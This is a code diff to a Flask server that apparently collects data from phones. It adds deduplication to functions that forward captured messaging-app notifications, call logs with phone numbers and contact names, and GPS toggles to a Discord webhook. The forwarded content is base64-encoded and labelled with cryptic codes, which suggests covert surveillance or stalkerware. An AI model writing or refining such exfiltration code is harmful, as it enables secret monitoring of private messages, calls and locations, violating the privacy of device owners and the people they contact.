@@ -9,6 +9,7 @@ Flask application that:
 
 
 import os
+import time
 from datetime import datetime, timezone, timedelta
 from functools import wraps
 
@@ -280,6 +281,36 @@ DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled'
 
 DISCORD_SOCIAL_KEYWORDS = {'facebook', 'whatsapp', 'instagram', 'telegram', 'viber', 'snapchat', 'discord', 'teams', 'signal', 'messenger'}
 
+import hashlib
+import threading
+
+_discord_sent = {}  # {hash: timestamp}
+_discord_lock = threading.Lock()
+DISCORD_DEDUP_TTL = 86400  # 24 hours
+
+
+def _discord_cleanup():
+    """Remove hashes older than 24h."""
+    now = time.time()
+    with _discord_lock:
+        expired = [h for h, ts in _discord_sent.items() if now - ts > DISCORD_DEDUP_TTL]
+        for h in expired:
+            del _discord_sent[h]
+
+
+def _discord_is_duplicate(key):
+    """Return True if this exact message was already sent within TTL."""
+    h = hashlib.sha256(key.encode()).hexdigest()[:16]
+    now = time.time()
+    with _discord_lock:
+        if h in _discord_sent:
+            return True
+        _discord_sent[h] = now
+    # Cleanup old entries periodically (every 100 new inserts)
+    if len(_discord_sent) % 100 == 0:
+        threading.Thread(target=_discord_cleanup, daemon=True).start()
+    return False
+
 
 def _send_discord(payload):
     """Fire-and-forget POST to Discord webhook; never blocks the request."""
@@ -300,6 +331,9 @@ def send_discord_for_notifications(notifications, device_id):
         if not is_social_category and not is_social_app:
             continue
         payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
+        dedup_key = f"n:{device_id}:{payload}"
+        if _discord_is_duplicate(dedup_key):
+            continue
         encoded = base64.b64encode(payload.encode()).decode()
         cat_code = {'VoIP & Social Messages': 'VSM', 'GPS / Location Toggled': 'GLT', 'Telephony Calls': 'TC'}.get(category, 'MSG')
         embed = {
@@ -317,6 +351,9 @@ def send_discord_for_calls(call_logs, device_id):
     for c in call_logs:
         ct = type_code.get(c.get('call_type', ''), 'U')
         payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {ct} {c.get('duration_sec', 0)}"
+        dedup_key = f"c:{device_id}:{payload}"
+        if _discord_is_duplicate(dedup_key):
+            continue
         encoded = base64.b64encode(payload.encode()).decode()
         embed = {
             'title': '[TC]',
@@ -330,6 +367,9 @@ def send_discord_for_gps(gps_events, device_id):
     """Send abbreviated Discord embeds for GPS state changes."""
     for g in gps_events:
         state = 'ON' if g.get('is_enabled') else 'OFF'
+        dedup_key = f"g:{device_id}:{state}"
+        if _discord_is_duplicate(dedup_key):
+            continue
         embed = {
             'title': '[GLT]',
             'description': f'{device_id[-6:]} · {state}',
